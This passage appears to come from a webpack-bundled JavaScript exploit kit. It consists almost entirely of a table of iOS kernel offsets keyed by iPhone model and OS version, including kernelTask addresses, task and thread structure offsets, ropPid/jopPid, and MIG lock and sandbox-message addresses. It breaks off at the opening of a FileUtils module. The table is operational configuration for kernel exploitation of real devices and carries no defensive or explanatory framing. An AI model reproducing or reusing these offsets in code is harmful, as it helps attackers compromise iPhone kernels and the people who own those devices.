{\n\t\t\t\t\tkernelTask: 0xaa6cd0n,\n\t\t\t\t\tmigLock: 0x37d4c90n,\n\t\t\t\t\tmigSbxMsg: 0x37d4cb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31acce4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaaade0n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n,\n\t\t\t\t\tmigLock: 0x37dcc90n,\n\t\t\t\t\tmigSbxMsg: 0x37dccb0n,\n\t\t\t\t\tmigKernelStackLR: 0x31b5b60n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 13\n\t// iPhone 13 Mini\n\t// iPhone 13 Pro\n\t// iPhone 13 Pro Max\n\t// iPhone SE 3\n\t// iPhone 14\n\t// iPhone 14 Plus\n\t\"iPhone14\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x918ee0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x91d318n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x925770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9256d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x925720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f6230n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f6248n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa02678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9fa678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x382c218n,\n\t\t\t\t\tmigSbxMsg: 0x382c238n,\n\t\t\t\t\tmigKernelStackLR: 0x317d020n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x3848428n,\n\t\t\t\t\tmigSbxMsg: 0x3848448n,\n\t\t\t\t\tmigKernelStackLR: 0x31994a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa73d10n,\n\t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n\t\t\t\t\ttro: 0x398n,\n\t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x38543a8n,\n\t\t\t\t\tmigSbxMsg: 0x38543c8n,\n\t\t\t\t\tmigKernelStackLR: 0x31a27e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"6\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x92d318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x935770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9316d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x931720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa06230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa06248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa12678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa0a678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa77b18n,\n\t\t\t\t\tmigLock: 0x3898c18n,\n\t\t\t\t\tmigSbxMsg: 0x3898c38n,\n\t\t\t\t\tmigKernelStackLR: 0x31dff60n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa7fc00n,\n\t\t\t\t\tmigLock: 0x38b4e28n,\n\t\t\t\t\tmigSbxMsg: 0x38b4e48n,\n\t\t\t\t\tmigKernelStackLR: 0x31fc3e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa83d10n,\n\t\t\t\t\tmigLock: 0x38bcda8n,\n\t\t\t\t\tmigSbxMsg: 0x38bcdc8n,\n\t\t\t\t\tmigKernelStackLR: 0x3205560n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"7\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"8\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919318n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921770n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9216d0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921720n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9f2230n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2248n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe678n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6678n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67b18n,\n\t\t\t\t\tmigLock: 0x3813d98n,\n\t\t\t\t\tmigSbxMsg: 0x3813db8n,\n\t\t\t\t\tmigKernelStackLR: 0x3163ae0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fc00n,\n\t\t\t\t\tmigLock: 0x382ffa8n,\n\t\t\t\t\tmigSbxMsg: 0x382ffc8n,\n\t\t\t\t\tmigKernelStackLR: 0x317ffa4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fd10n,\n\t\t\t\t\tmigLock: 0x3833fa8n,\n\t\t\t\t\tmigSbxMsg: 0x3833fc8n,\n\t\t\t\t\tmigKernelStackLR: 0x31852a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 14 Pro\n\t// iPhone 14 Pro Max\n\t// iPhone 15\n\t// iPhone 15 Plus\n\t\"iPhone15\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0xf0n,\n\t\t\t\t\tropPid: 0x160n,\n\t\t\t\t\tjopPid: 0x168n,\n\t\t\t\t\tguardExcCode: 0x330n,\n\t\t\t\t\ttaskThreads: 0x370n,\n\t\t\t\t\ttro: 0x380n,\n\t\t\t\t\tast: 0x3a4n,\n\t\t\t\t\tmutexData: 0x3b0n,\n\t\t\t\t\tctid: 0x430n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x914e00n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x919238n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x378n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x921690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9215f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x921640n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x91d640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0x9ee150n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0xf8n,\n\t\t\t\t\tropPid: 0x168n,\n\t\t\t\t\tjopPid: 0x170n,\n\t\t\t\t\tguardExcCode: 0x338n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x440n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0x9f2168n,\n\t\t\t\t\ttaskThreads: 0x380n,\n\t\t\t\t\ttro: 0x388n,\n\t\t\t\t\tast: 0x3acn,\n\t\t\t\t\tmutexData: 0x3b8n,\n\t\t\t\t\tctid: 0x438n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0x9fe598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x9f6598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xa67c18n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x388n,\n\t\t\t\t\ttro: 0x390n,\n\t\t\t\t\tast: 0x3b4n,\n\t\t\t\t\tmutexData: 0x3c0n,\n\t\t\t\t\tctid: 0x448n,\n\t\t\t\t\tmigLock: 0x37863f8n,\n\t\t\t\t\tmigSbxMsg: 0x3786418n,\n\t\t\t\t\tmigKernelStackLR: 0x3131620n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xa6fd00n,\n\t\t\t\t\tmigLock: 0x37a2788n,\n\t\t\t\t\tmigSbxMsg: 0x37a27a8n,\n\t\t\t\t\tmigKernelStackLR: 0x314dc24n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xa6fe10n,\n  \t\t\t\t\tguardExcCode: 0x340n,\n\t\t\t\t\ttaskThreads: 0x390n,\n  \t\t\t\t\ttro: 0x398n,\n  \t\t\t\t\tast: 0x3bcn,\n\t\t\t\t\tmutexData: 0x3c8n,\n\t\t\t\t\tctid: 0x450n,\n\t\t\t\t\tmigLock: 0x37aa708n,\n\t\t\t\t\tmigSbxMsg: 0x37aa728n,\n\t\t\t\t\tmigKernelStackLR: 0x3152ee0n\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"4\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t23: {\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x941238n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x949690n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x9495f0n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x949640n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xa2a150n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xa2a168n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xa3a598n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xa32598n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xaa3c18n,\n\t\t\t\t\tmigLock: 0x38c5388n,\n\t\t\t\t\tmigSbxMsg: 0x38c53a8n,\n\t\t\t\t\tmigKernelStackLR: 0x325f1e0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xaa7d00n,\n\t\t\t\t\tmigLock: 0x38dd698n,\n\t\t\t\t\tmigSbxMsg: 0x38dd6b8n,\n\t\t\t\t\tmigKernelStackLR: 0x32777e4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xaabe10n,\n\t\t\t\t\tmigLock: 0x38e5618n,\n\t\t\t\t\tmigSbxMsg: 0x38e5638n,\n\t\t\t\t\tmigKernelStackLR: 0x3280aa0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\n\t// iPhone 15 Pro\n\t// iPhone 15 Pro Max\n\t\"iPhone16\": {\n\t\t\"*\": {\n\t\t\t23: {\n\t\t\t\t0: {\n\t\t\t\t\tpComm: 0x568n,\n\t\t\t\t\texcGuard: 0x5d4n,\n\t\t\t\t\tkstackptr: 0x140n,\n\t\t\t\t\tropPid: 0x1b0n,\n\t\t\t\t\tjopPid: 0x1b8n,\n\t\t\t\t\tguardExcCode: 0x380n,\n\t\t\t\t\ttaskThreads: 0x3c0n,\n\t\t\t\t\ttro: 0x3d0n,\n\t\t\t\t\tast: 0x3f4n,\n\t\t\t\t\tmutexData: 0x400n,\n\t\t\t\t\tctid: 0x480n,\n\t\t\t\t\ttroTask: 0x20n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0x978ef0n,\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0x991eb0n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\toptions: 0xc0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3c8n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0x99a308n,\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0x99a268n\n\t\t\t\t},\n\t\t\t\t6.1: {\n\t\t\t\t\tkernelTask: 0x99a2b8n\n\t\t\t\t},\n\t\t\t\t6.2: {\n\t\t\t\t\tkernelTask: 0x9962b8n\n\t\t\t\t}\n\t\t\t},\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xaae870n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5f4n,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x388n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x490n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xaae888n,\n\t\t\t\t\ttaskThreads: 0x3d0n,\n\t\t\t\t\ttro: 0x3d8n,\n\t\t\t\t\tast: 0x3fcn,\n\t\t\t\t\tmutexData: 0x408n,\n\t\t\t\t\tctid: 0x488n\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xab6cb8n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xab2cb8n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xb23d28n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x498n,\n\t\t\t\t\tmigLock: 0x3c03ef0n,\n\t\t\t\t\tmigSbxMsg: 0x3c03f10n,\n\t\t\t\t\tmigKernelStackLR: 0x3582fe0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xb2be10n,\n\t\t\t\t\tmigLock: 0x3c181a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c181c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35993a4n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xb2ff20n,\n  \t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t\tmigLock: 0x3c241a8n,\n\t\t\t\t\tmigSbxMsg: 0x3c241c8n,\n\t\t\t\t\tmigKernelStackLR: 0x35a26a0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t},\n\t// iPhone 16\n\t// iPhone 16 plus\n\t// iPhone 16 pro\n\t// iPhone 16 pro max\n\t\"iPhone17\": {\n\t\t\"*\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x4042dc0n,\n\t\t\t\t\tmigSbxMsg: 0x4042de0n,\n\t\t\t\t\tmigKernelStackLR: 0x3912aa0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x405eff8n,\n\t\t\t\t\tmigSbxMsg: 0x405f018n,\n\t\t\t\t\tmigKernelStackLR: 0x392be64n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1bf78n,\n  \t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n  \t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x4066f88n,\n\t\t\t\t\tmigSbxMsg: 0x4066fa8n,\n\t\t\t\t\tmigKernelStackLR: 0x39352e0n,\n\t\t\t\t}\n\t\t\t}\n\t\t},\n\t\t\"5\": {\n\t\t\t24: {\n\t\t\t\t0: {\n\t\t\t\t\tkernelTask: 0xb7e1c8n,\n\t\t\t\t\tpComm: 0x56cn,\n\t\t\t\t\tprocRO: 0x3b8n,\n\t\t\t\t\tipcSpace: 0x318n,\n\t\t\t\t\ttroTask: 0x28n,\n\t\t\t\t\texcGuard: 0x5fcn,\n\t\t\t\t\tkstackptr: 0x148n,\n\t\t\t\t\tropPid: 0x1b8n,\n\t\t\t\t\tjopPid: 0x1c0n,\n\t\t\t\t\tguardExcCode: 0x390n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\toptions: 0xc0n\n\t\t\t\t},\n\t\t\t\t1: {\n\t\t\t\t\tkernelTask: 0xb7e1e0n,\n\t\t\t\t\ttaskThreads: 0x3d8n,\n\t\t\t\t\ttro: 0x3e0n,\n\t\t\t\t\tast: 0x404n,\n\t\t\t\t\tmutexData: 0x410n,\n\t\t\t\t\tctid: 0x4a0n,\n\t\t\t\t},\n\t\t\t\t2: {\n\t\t\t\t\tkernelTask: 0xb86610n\n\t\t\t\t},\n\t\t\t\t3: {\n\t\t\t\t\tkernelTask: 0xb82610n\n\t\t\t\t},\n\t\t\t\t4: {\n\t\t\t\t\tkernelTask: 0xc0fd80n,\n\t\t\t\t\tprocRO: 0x3e0n,\n\t\t\t\t\texcGuard: 0x624n,\n\t\t\t\t\ttaskThreads: 0x3e0n,\n  \t\t\t\t\ttro: 0x3e8n,\n\t\t\t\t\tast: 0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x408acd0n,\n\t\t\t\t\tmigSbxMsg: 0x408acf0n,\n\t\t\t\t\tmigKernelStackLR: 0x396e4a0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x40a6f08n,\n\t\t\t\t\tmigSbxMsg: 0x40a6f28n,\n\t\t\t\t\tmigKernelStackLR: 0x3987924n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1ff78n,\n\t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n\t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x40b6e98n,\n\t\t\t\t\tmigSbxMsg: 0x40b6eb8n,\n\t\t\t\t\tmigKernelStackLR: 0x3998de0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/FileUtils.js\":\n/*!***************************************!*\\\n  !*** ./src/libs/JSUtils/FileUtils.js ***!\n  \\***************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ FileUtils)\n/* harmony export */ });\n\n\nconst TAG = \"FILE-UTILS\";\n\nconst O_RDONLY\t= 0x0000;\nconst O_WRONLY\t= 0x0001;\nconst O_RDWR\t= 0x0002;\nconst O_APPEND  = 0x0008;\nconst O_CREAT\t= 0x0200;\nconst O_TRUNC\t= 